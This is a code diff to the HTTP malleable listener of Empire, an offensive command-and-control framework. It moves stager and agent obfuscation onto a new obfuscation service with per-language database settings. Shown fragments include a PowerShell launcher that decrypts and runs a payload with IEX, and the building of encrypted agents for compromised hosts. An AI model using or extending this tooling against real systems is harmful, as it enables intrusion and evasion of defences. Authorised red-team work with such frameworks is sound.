@@ -17,6 +17,7 @@ from typing import List, Optional, Tuple
 from flask import Flask, Response, make_response, render_template, request
 
 from empire.server.common import encryption, helpers, malleable, packets, templating
+from empire.server.common.empire import MainMenu
 from empire.server.database import models
 from empire.server.database.base import SessionLocal
 from empire.server.utils import data_util, listener_util, log_util
@@ -27,7 +28,7 @@ log = logging.getLogger(__name__)
 
 
 class Listener(object):
-    def __init__(self, mainMenu, params=[]):
+    def __init__(self, mainMenu: MainMenu, params=[]):
 
         self.info = {
             "Name": "HTTP[S] MALLEABLE",
@@ -432,8 +433,7 @@ class Listener(object):
                 launcherBase += "-join[Char[]](& $R $data ($IV+$K))|IEX"
 
                 if obfuscate:
-                    launcherBase = data_util.obfuscate(
-                        self.mainMenu.installPath,
+                    launcherBase = self.mainMenu.obfuscationv2.obfuscate(
                         launcherBase,
                         obfuscationCommand=obfuscationCommand,
                     )
@@ -623,7 +623,7 @@ class Listener(object):
                 stager = f.read()
 
             # Get the random function name generated at install and patch the stager with the proper function name
-            stager = data_util.keyword_obfuscation(stager)
+            stager = self.mainMenu.obfuscationv2.obfuscate_keywords(stager)
 
             # patch in custom headers
             if profile.stager.client.headers:
@@ -664,8 +664,7 @@ class Listener(object):
                     unobfuscated_stager += line
 
             if obfuscate:
-                unobfuscated_stager = data_util.obfuscate(
-                    self.mainMenu.installPath,
+                unobfuscated_stager = self.mainMenu.obfuscationv2.obfuscate(
                     unobfuscated_stager,
                     obfuscationCommand=obfuscationCommand,
                 )
@@ -757,7 +756,7 @@ class Listener(object):
                 code = f.read()
 
             # Get the random function name generated at install and patch the stager with the proper function name
-            code = data_util.keyword_obfuscation(code)
+            code = self.mainMenu.obfuscationv2.obfuscate_keywords(code)
 
             # path in the comms methods
             commsCode = self.generate_comms(
@@ -787,8 +786,7 @@ class Listener(object):
                     "$KillDate,", "$KillDate = '" + str(killDate) + "',"
                 )
             if obfuscate:
-                code = data_util.obfuscate(
-                    self.mainMenu.installPath,
+                code = self.mainMenu.obfuscationv2.obfuscate(
                     code,
                     obfuscationCommand=obfuscationCommand,
                 )
@@ -1447,12 +1445,20 @@ Start-Negotiate -S '$ser' -SK $SK -UA $ua;
                                         log.info(message)
 
                                         # build stager (stage 1)
-                                        stager = self.generate_stager(
-                                            language=language,
-                                            listenerOptions=listenerOptions,
-                                            obfuscate=self.mainMenu.obfuscate,
-                                            obfuscationCommand=self.mainMenu.obfuscateCommand,
-                                        )
+                                        with SessionLocal() as db:
+                                            obf_config = self.mainMenu.obfuscationv2.get_obfuscation_config(
+                                                db, language
+                                            )
+                                            stager = self.generate_stager(
+                                                language=language,
+                                                listenerOptions=listenerOptions,
+                                                obfuscate=False
+                                                if not obf_config
+                                                else obf_config.enabled,
+                                                obfuscationCommand=""
+                                                if not obf_config
+                                                else obf_config.command,
+                                            )
 
                                         # build malleable response with stager (stage 1)
                                         malleableResponse = (
@@ -1521,17 +1527,25 @@ Start-Negotiate -S '$ser' -SK $SK -UA $ua;
                                             version = ""
 
                                         # generate agent
-                                        agentCode = self.generate_agent(
-                                            language=language,
-                                            listenerOptions=(
-                                                tempListenerOptions
-                                                if tempListenerOptions
-                                                else listenerOptions
-                                            ),
-                                            obfuscate=self.mainMenu.obfuscate,
-                                            obfuscationCommand=self.mainMenu.obfuscateCommand,
-                                            version=version,
-                                        )
+                                        with SessionLocal() as db:
+                                            obf_config = self.mainMenu.obfuscationv2.get_obfuscation_config(
+                                                db, language
+                                            )
+                                            agentCode = self.generate_agent(
+                                                language=language,
+                                                listenerOptions=(
+                                                    tempListenerOptions
+                                                    if tempListenerOptions
+                                                    else listenerOptions
+                                                ),
+                                                obfuscate=False
+                                                if not obf_config
+                                                else obf_config.enabled,
+                                                obfuscationCommand=""
+                                                if not obf_config
+                                                else obf_config.command,
+                                                version=version,
+                                            )
                                         encryptedAgent = (
                                             encryption.aes_encrypt_then_hmac(
                                                 sessionKey, agentCode
